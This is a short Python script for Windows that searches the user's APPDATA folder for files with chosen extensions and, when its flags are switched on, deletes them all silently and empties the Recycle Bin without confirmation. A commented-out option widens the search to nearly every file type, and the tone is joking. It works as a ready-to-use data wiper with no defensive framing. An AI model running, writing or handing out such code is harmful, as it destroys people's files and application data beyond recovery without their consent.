import os
import winshell

DELETE_ALL = False
EMPTY_RECYCLE_BIN = False
PRINT_ALL_FILES =  True

user = os.getlogin()
roaming = os.getenv("APPDATA")
walk = os.walk(roaming)
list_file = []

#make sure the extension starts with .YOUR_EXTENSION
extensions = ".dll" # Enter your file extension here


"""Don't know what to chose? Here is a big list lmao just make the other extensions a comment and uncomment this one"""
#extensions = ".asm", ".bat", ".bin", ".c", ".cfg", ".cmd", ".com", ".cpp", ".cs", ".css", ".csv", ".dat", ".db", ".dbf", ".dll", ".dmp", ".doc", ".docx", ".drv", ".exe", ".fla", ".flv", ".gif", ".h", ".htm", ".html", ".ini", ".iso", ".java", ".jpeg", ".jpg", ".js", ".log", ".m4a", ".m4v", ".mdb", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".msi", ".msu", ".odb", ".odc", ".odf", ".odg", ".odp", ".ods", ".odt", ".pdf", ".php", ".png", ".pps", ".ppt", ".pptx", ".ps", ".psd", ".py", ".rar", ".reg", ".rtf", ".sav", ".sql", ".svg", ".swf", ".sys", ".tar", ".tga", ".tgz", ".tmp", ".txt", ".vbs", ".vcf", ".wav", ".wma", ".wmv", ".xls", ".xlsx", ".xml", ".xsl", ".xslx", ".zip"

try: 
    for root, dirs, files in walk:
        for file in files:
            if file.endswith(extensions):
                list_file.append(os.path.join(root, file))
except:
    pass

if PRINT_ALL_FILES == True:
    print(list_file)


if DELETE_ALL == True:
    for i in range(len(list_file)):
        try:
            os.remove(list_file[i])
        except:
            pass


#:skull:
if EMPTY_RECYCLE_BIN == True:
    try:
        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
    except:
        pass
